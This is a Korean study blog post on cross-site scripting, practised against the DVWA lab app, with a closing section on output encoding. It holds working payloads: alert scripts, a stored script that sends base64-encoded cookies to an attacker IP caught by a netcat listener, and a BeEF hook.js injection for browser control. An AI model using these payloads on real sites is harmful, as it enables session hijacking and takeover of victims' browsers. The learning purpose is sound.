---
layout: post
title: "XSS 공부"
date: 2025-09-28 17:00:00 +0900
categories: [웹 해킹]
---

### 1. 개요

XSS(Cross-Site Scripting)는 공격자가 웹 애플리케이션에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 해당 스크립트가 실행되도록 만드는 공격이다. 이 공격은 [A03: Injection](https://hamap0.github.io/projects/owasp-top-10/2025/08/27/A03_Injection.html) 보고서에서 다룬 인젝션 공격의 한 종류이며 주로 세션 쿠키 탈취 등에 사용된다.

---

### 2. 기본 유형 및 실습

#### ***Reflected XSS (반사형)***

Reflected XSS는 사용자의 입력이 서버를 거쳐 즉시 응답 페이지에 반영될 때 발생한다.  
DVWA의 `XSS (Reflected)` 페이지는 `name` 파라미터의 값을 별도의 검증 없이 HTML 응답에 삽입한다.

다음과 같은 요청을 전송하면

```
GET /vulnerabilities/xss_r/?name=<script>alert('Reflected%20XSS')</script> HTTP/1.1
Host: dvwa.local
```

서버는 입력값을 그대로 포함한 응답을 반환한다.

```html
<h1>Hello <script>alert('Reflected XSS')</script>!</h1>
```

브라우저는 이 HTML을 파싱하면서 `<script>` 태그를 실행하고 경고창을 표시한다.  
이 공격은 URL에 의존하므로, 공격자는 피싱 링크를 통해 피해자를 유도할 수 있다.

---

#### ***Stored XSS (저장형)***

Stored XSS는 공격 페이로드가 서버의 데이터베이스나 파일 시스템에 영구적으로 저장된 후,  
해당 페이지를 방문하는 모든 사용자에게 전달될 때 발생한다.

DVWA의 `XSS (Stored)` 페이지는 방명록 메시지를 데이터베이스에 저장한 뒤,  
모든 방문자에게 동일한 HTML로 출력한다.

공격자가 다음 메시지를 등록하면,

```html
<script>alert('Stored XSS')</script>
```

서버는 이를 저장하고, 이후 페이지 접근 시 다음과 같은 구조로 응답한다.

```html
<div class="guestbook-post">
  <script>alert('Stored XSS')</script>
</div>
```

이 경우, 해당 페이지를 방문하는 모든 사용자의 브라우저에서 스크립트가 실행된다.  
공격 범위가 Reflected XSS보다 훨씬 넓다는 점에서 위험성이 크다.

---

### 3. 심화 활용: 쿠키 탈취

XSS 취약점은 사용자의 세션 쿠키를 탈취하여 계정을 도용하는 세션 하이재킹(Session Hijacking) 공격에 사용될 수 있다.

   ***1. 공격자 리스너 준비***
   공격자는 Netcat을 사용해 HTTP 요청을 수신하는 리스너를 실행한다.  
   ```bash
   sudo nc -lvnp 80
   ```

이 명령은 80번 포트에서 들어오는 연결을 대기합니다.

   ***2. 쿠키 탈취 페이로드 작성***  
   다음 스크립트는 현재 도메인의 쿠키를 읽어 공격자 서버로 전송한다.  
   ```javascript
   <script>
     document.location = 'http://192.9.200.12/?cookie=' + btoa(document.cookie);
   </script>
   ```  
   - `document.cookie`: 현재 세션의 모든 쿠키를 반환  
   - `btoa()`: 특수문자로 인한 URL 파싱 오류를 방지하기 위해 Base64 인코딩 수행  

   ***3. 페이로드 주입 및 실행***  
   위 스크립트를 Stored XSS 취약점에 삽입하면, 피해자가 페이지를 방문할 때마다 브라우저가 자동으로 다음 요청을 보낸다.
   ```
   GET /?cookie=c2VjdXJpdHk9bG93OyBQSFBTRVNTSUQ9YWJjMTIz HTTP/1.1
   Host: 192.9.200.12
   User-Agent: Mozilla/5.0 ...
   ```

   ***4. 쿠키 복원***  
   공격자는 수신된 Base64 문자열을 디코딩해 실제 쿠키 값을 확인할 수 있다.  
   ```bash
   echo "c2VjdXJpdHk9bG93OyBQSFBTRVNTSUQ9YWJjMTIz" | base64 -d
   # 출력: security=low; PHPSESSID=abc123
   ```  
   이 값을 자신의 브라우저에 주입하면 피해자의 세션으로 로그인할 수 있다.

---

### 4. 심화 활용 2: 브라우저 제어권 획득 (BeEF 연동)

XSS 공격의 파급력은 쿠키 탈취에 그치지 않는다. **BeEF(The Browser Exploitation Framework)**와 연동하면 피해자의 브라우저를 좀비처럼 제어하여 추가 공격을 수행할 수 있다.  

1. ***BeEF 실행***  
   공격자는 다음 명령으로 BeEF를 시작한다.  
   ```bash
   sudo beef-xss
   ```  
   BeEF는 기본적으로 `http://192.9.200.12:3000/ui/panel`에서 관리자 인터페이스를 제공하며,  
   Hook 스크립트 URL은 다음과 같다.
   ```html
   <script src="http://192.9.200.12:3000/hook.js"></script>
   ```

2. ***Hook 스크립트 주입***  
   이 스크립트를 Stored XSS 취약점에 삽입하면
   방문자의 브라우저는 자동으로 `hook.js`를 로드하고 BeEF 서버에 연결된다.

3. ***브라우저 제어***  
   BeEF 관리자 패널의 `Online Browsers` 탭에서는 연결된 브라우저의 다음 정보를 확인할 수 있다.
   - IP 주소  
   - 운영체제  
   - 브라우저 종류 및 버전  

   공격자는 `Commands` 탭에서 다양한 모듈을 실행할 수 있다.
   - **Get Cookies**: `document.cookie` 값을 수집  
   - **Redirect Browser**: 특정 URL로 강제 이동  
   - **Create Alert Dialog**: 사용자에게 경고창 표시  

   이러한 기능은 추가적인 사회공학 공격이나 정보 수집에 활용된다.

---

### 5. 방어 방안: 출력 인코딩

XSS를 방어하는 가장 효과적인 방법은 **모든 사용자 입력을 출력 시 인코딩**하는 것이다.  
브라우저가 입력값을 HTML 태그나 스크립트로 해석하지 못하도록,  
특수문자를 안전한 HTML 엔터티로 변환해야 한다.

예를 들어, 다음 문자는 다음과 같이 인코딩되어야 한다.
- `<` → `&lt;`  
- `>` → `&gt;`  
- `&` → `&amp;`  
- `"` → `&quot;`  
- `'` → `&#039;`  

PHP에서는 `htmlspecialchars()` 함수를 사용해 이를 처리할 수 있다.
```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```  

이렇게 인코딩된 출력은 브라우저에서 **단순 텍스트로만 표시**되며,  
스크립트 실행이나 태그 해석이 발생하지 않는다.

<hr class="short-rule">